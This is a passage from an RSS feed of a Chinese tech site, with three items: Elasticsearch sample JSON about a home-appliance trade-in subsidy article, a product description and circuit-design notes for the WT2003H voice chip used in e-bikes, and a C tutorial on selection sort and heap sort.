"近期，在消费品以旧换新政策支持下，各地不断加力促消费、惠民生。其中，家装厨卫是支持的重要领域之一，多地出台补贴政策、开展促销活动，对旧房翻新、局部改造等进行补贴。系列举措在提升消费者居住环境的同时，也释放了消费潜力、激发了市场活力。"
,
"comment"
:
"家装厨卫"
,
"mobile"
:
"111111"
}
{
"index"
:
{
"_id"
:
4
}
}
{
"id"
:
4
,
"title"
:
"家装厨卫以旧换新释放消费潜力"
,
"content"
:
"近期，在消费品以旧换新政策支持下，各地不断加力促消费、惠民生。其中，家装厨卫是支持的重要领域之一，多地出台补贴政策、开展促销活动，对旧房翻新、局部改造等进行补贴。系列举措在提升消费者居住环境的同时，也释放了消费潜力、激发了市场活力。"
,
"comment"
:
"家装厨卫"
,
"mobile"
:
"111111"
}</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540206.html</guid><pubDate>Fri, 31 Oct 2025 07:28:22 +0000</pubDate></item><item><title>WT2003H语音芯片MCU下载方案助力电动车智能化升级：实现多功能语音提示+报警功能</title><link>https://www.ppmy.cn/news/1540207.html</link><description>一：产品市场
随着科技的发展，电瓶车在技术革新上也在不断进步，如今许多厂家，都会加入语音提示功能，能在倒车、喇叭、故障时发出语音报警，提示骑行者电量不足、倒车请注意、故障语音提示等；唯创知音专注于高品质、智能化、安全可靠的代步产品语音研发和生产,打造轻松的出行方式。
二、产品应用
语音芯片：WT2003HX
WT2003HX是一款功能强大的高品质语音芯片，采用了高性能32位处理器、最高频率可达120MHz。具有低成本、低功耗、高可靠性、通用性强等特点，可内200KBYTE�KBYTE语音容量,内置语音需要U盘拷贝进去。现有WT2003HX-16S、WT2003HX-24SS、WT2003HP8-32N（体积小4*4MM）三种封装的芯片。串口传输音频目前支持UART通信传输。
三、芯片功能特点
UART控制模式：标准UART通信接口，默认波特率115200；支持SPI-Flash作为存储器。带有文件索引播放、插播、单曲循环、所有曲目循环、随机播放等功能。32级音量可调、最大可以支持外挂128Mbit的Flash；
支持通过UART修改外置flash的语音内容，支持外挂SPIFlash模拟U盘功能；
上电默认不播放；具备BUSY状态指示、BUSY平时为低电平，播放时为高电平；
支持切换音频输出方式，样品默认SPK输出，如需DAC输出，请参考音频输出切换指令；
支持语音高品质音频格式，传输音频只支持MP3格式，（支持采样率8K-44.1K，单声道音频码率支持8kbps~320kbps，双声道音频码率8kbps~128kbps）声音优美；
工作电压：2.4-5.2V；
内置0.5WD类功放；
两个16位异步分频器定时器；
数字音频流,IIS支持主机和从机模式；
一个红外遥控解码器；
16bit高精度ADC和DAC；
大功率IO驱动能力，最高可直接驱动64mA；
单芯片使用（使用内置容量）时内置语音需出厂前写入。
支持SD卡/U盘离线升级程序,建议画板时预留出USB接口；
串口传输音频到外挂Flash前需要将Flash格式化成FAT格式，因语音芯片需要先在Flash中写入FAT系统格式，才能传输保存音频；格式化Flash需要通过USB接口连接到电脑，会自动提示格式化或者出厂前与本司业务沟通，提前烧录一个格式化OK的.bin文件到外挂Flash，用户可免格式化；
通过USB接口连接电脑，电脑上显示Flash盘符，可直接从电脑拷贝音频到盘符，拷贝完成后，需拔掉USB线，再进行串口控制播放，否则串口发码无响应；模块管脚介绍WT2003H系列芯片的封装SOP16、TSSOP24和QFN32芯片，适合应用于各种场合，其引脚简图以及管脚定义如下：
SOP16封装管脚：
注：COM（位）-IO口可扩展作为数码管位选使用；
LED(段)-IO口可扩展作为数码管段选使用；
Key（按键）-IO口可扩展作为按键使用；
ADC-IO可扩展作为信号采集（MIC采集、按键阻值检测）使用；
上述数码管、按键、ADC扩展功能，标准品程序未开放，如有需要，请和本司业务沟通!
TSSOP24封装管脚：
注：COM（位）-IO口可扩展作为数码管位选使用；
LED(段)-IO口可扩展作为数码管段选使用；
Key（按键）-IO口可扩展作为按键使用；
ADC-IO可扩展作为信号采集（MIC采集、按键阻值检测）使用；
上述数码管、按键、ADC扩展功能，标准品程序未开放，如有需要，请和本司业务沟通!
QFN32封装管脚：
注：COM（位）-IO口可扩展作为数码管位选使用；
LED(段)-IO口可扩展作为数码管段选使用；
Key（按键）-IO口可扩展作为按键使用；
ADC-IO可扩展作为信号采集（MIC采集、按键阻值检测）使用；
上述数码管、按键、ADC扩展功能，标准品程序未开放，如有需要，请和本司业务沟通!
四、
电路设计参考
（一）当MCU电平与语音芯片电平不匹配时，请加电平转换电路，如下图：
（二）AGND跟GND在外接功放时，需接0R电阻进行隔离，如下图：
（三）VCC、VOUT，必须靠近芯片管脚1CM内接106电容到地，回路不要过长，如下图：
注：当DAC输出时，1）可根据实际需求在VCC管脚原有106电容的基础上，再并一个104电容（小电容参数可根据具体需求调节，一般为104，也可102/103），进行滤波调节，降低因电源纹波造成的底噪；2）语音芯片GND与功放GND分开走线回到电池GND，避免共地回路引起的噪声
（四）建议画板时预留出USB接口，如下图：
建议将语音芯片的烧录口，作为测试点，全部引出在PCB板上。这样做的好处：
1.用户可通过USB接口更换Flash或TF内音频文件，如果出现特殊异常或混料，则可以不用拆芯片，我司可以协助直接在线刷语音程序。
2.贵司备货之后，如果突然客户要新增功能。我司也可以协助提供升级程序进行U盘升级。
更新口为：USB接口</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540207.html</guid><pubDate>Fri, 31 Oct 2025 07:28:25 +0000</pubDate></item><item><title>每日回顾：简单用C写 选择排序、堆排序</title><link>https://www.ppmy.cn/news/1540208.html</link><description>选择排序
直接选择排序（Selection Sort）是一种简单的排序算法。它的基本思想是每次从未排序的部分中选择最小（或最大）的元素，将其放到已排序部分的末尾。
版本一：
//直接选择排序1
void SelectSort_1(int* a, int n) {for (int j = n; j &gt; 1; j--) {	//逐渐缩小未排序范围，剩一个元素时不用再进循环int max = 0;for (int i = 1; i &lt; j; i++) {if (a[i] &gt; a[max]) {max = i;}}//找到最大的元素，交换到末尾int tmp = a[j - 1];a[j - 1] = a[max];a[max] = tmp;}
}
版本二：
//直接选择排序2
void SelectSort_2(int* a, int n) {int left = 0;int right = n - 1;while (left &lt; right) {int maxi = left;int mini = right;for (int i = left; i &lt;= right; i++) {	//每次循环，找出一个最大一个最小值if (a[i] &lt; a[mini]) {mini = i;}else if(a[i] &gt; a[maxi]) {maxi = i;}}//最大最小值分别与首尾交换，左右下标指针向中间收缩int tmp = a[left];a[left] = a[mini];a[mini] = tmp;//可能会出现 mini/maxi 在 left/right 位置上//交换一次后，mini/maxi 的位置会改变//修正if (maxi == left) {maxi = mini;}tmp = a[right];a[right] = a[maxi];a[maxi] = tmp;left++;right--;}
}
版本区别
版本二从首尾开始，向中间收缩；消耗的时间减少一半，虽然并没什么用......
时间复杂度
两个循环嵌套，O(n^2)
空间复杂度
原地修改，O(1)
稳定性
存在元素的交换，不稳定
堆排序
堆排序（Heap Sort）是一种基于选择 or 比较的排序算法，它利用了二叉堆数据结构。堆排序分为两个主要的步骤：构建大堆（或小堆）和执行排序。
大致思想：
先建堆、如果升序，就建大堆；
接着对大堆执行排序：首尾元素交换（此时尾元素最大）、将尾元素视作堆之外的元素，将刚刚的首元素向下调整以保证大堆性质；
之后重复上一步操作，即可
//向下调整
void AdjustDown(int* a, int n, int parent) {int child = parent * 2 + 1;	//左孩子while (child &lt; n) {//找出较大的孩子、和父节点对比--&gt;是否需要交换if (child &lt; n - 1 &amp;&amp; a[child] &lt; a[child + 1]) {child++;}if (a[child] &gt; a[parent]) {	//建立大堆int tmp = a[child];a[child] = a[parent];a[parent] = tmp;parent = child;child = parent * 2 + 1;}else {break;}}
}
//堆排序
void HeapSort(int* a, int n) {//循环来调整每个子树、以建立大堆for (int i = (n - 1 - 1) / 2; i &gt;= 0; i--) {	//(n-1-1)/2 为最后一个节点的父节点，因为 n-1 是数组最后一个下标AdjustDown(a, n, i);}//对大堆进行操作，以完成升序for (int i = n - 1; i &gt; 0; i--) {//首尾交换int tmp = a[0];a[0] = a[i];a[i] = tmp;//首元素向下调整AdjustDown(a, i, 0);}//此时数组已为升序
}
时间复杂度
堆排序的时间复杂度取决于建堆时的调整次数O(n*logn)、执行排序时每次取出一个元素然后调堆O(n*logn)，所以总体为O(n*logn)
空间复杂度
原地修改，O(1)
稳定性
堆排序依赖于堆的性质和排序过程中的交换操作，不稳定</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540208.html</guid><pubDate>Fri, 31 Oct 2025 07:28:27 +0000</pubDate></item></channel></rss>